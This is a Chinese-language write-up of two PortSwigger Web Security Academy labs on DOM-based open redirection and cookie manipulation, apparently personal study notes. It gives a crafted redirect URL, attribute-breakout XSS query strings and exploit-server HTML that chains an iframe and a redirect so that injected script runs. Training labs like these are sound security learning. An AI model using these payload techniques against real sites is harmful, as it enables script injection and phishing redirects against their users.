---
title: PortSwigger DOM-based vulnerabilities
description: PortSwigger DOM-based vulnerabilities
---

## 資源

這邊整理了可能會有 DOM-based vulnerabilities 的情境

- https://portswigger.net/web-security/dom-based#common-sources
- https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities
- https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities

## Lab: DOM-based open redirection

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection |
| Lab       | https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection                         |

在評論頁面 `/post?postId=6` 下方的 Back to Blog，有以下程式碼

```js
returnUrl = /url=(https?:\/\/.+)/.exec(location);
location.href = returnUrl ? returnUrl[1] : "/";
```

構造 `https://0a130030047030c880bdc72300910016.web-security-academy.net/post?postId=6&url=https://exploit-0aeb00cd0416304980e8c6bc01cd00d9.exploit-server.net`，並且點擊 Back to Blog，即可完成

## Lab: DOM-based cookie manipulation

| Dimension | Description                                                                                              |
| --------- | -------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-dom-based-cookie-manipulation |
| Lab       | https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation           |

首先用 `document.cookie` 去搜尋，找到在商品頁 `/product?productId=1` 有以下 js

```js
document.cookie =
  "lastViewedProduct=" + window.location + "; SameSite=None; Secure";
```

並且重整後，會在右上角看到

```html
<a
  href="https://0a2200800321237180a52b3d00ca004a.web-security-academy.net/product?productId=1"
  >Last viewed product</a
>
```

構造以下 querystring

- decode：`?productId=1&xss=' tabindex=0 autofocus onfocus='print()`
- encode：`?productId=1&xss='%20tabindex=0%20autofocus%20onfocus=%27print()`

在 exploit-server 構造以下 html

```html
<html>
  <head></head>
  <body>
    <iframe
      src="https://0a2200800321237180a52b3d00ca004a.web-security-academy.net/product?productId=1&xss='%20tabindex=0%20autofocus%20onfocus=%27print()"
    ></iframe>
  </body>
</html>
```

View exploit => 看到 `Blocked autofocusing on a <a> element in a cross-origin subframe.`，看來這題沒這麼好解...

改成注入新的 DOM 試試看

- decode： `?productId=1&xss='></a><img src='x' onerror='print()'/><a href='`
- encode： `?productId=1&xss=%27></a><img%20src=%27x%27%20onerror=%27print()%27/><a%20href=%27`

由於第一次進入商品頁會寫入 `document.cookie`，第二次進入商品頁才會觸發 XSS，所以我們需要先用 `<iframe>` 模擬第一次的載入，在 exploit-server 構造以下 html

```html
<html>
  <head></head>
  <body>
    <script>
      function redirectToVulnPage() {
        location.href =
          "https://0a2200800321237180a52b3d00ca004a.web-security-academy.net/product?productId=1&xss=%27></a><img%20src=%27x%27%20onerror=%27print()%27/><a%20href=%27";
      }
    </script>
    <iframe
      src="https://0a2200800321237180a52b3d00ca004a.web-security-academy.net/product?productId=1&xss=%27></a><img%20src=%27x%27%20onerror=%27print()%27/><a%20href=%27"
      onload="redirectToVulnPage()"
    ></iframe>
  </body>
</html>
```

這題我覺得蠻有趣，需要結合 [Cross-site scripting](./port-swigger-cross-site-scripting.md) 的知識

##

## 參考資料

- https://portswigger.net/web-security/dom-based
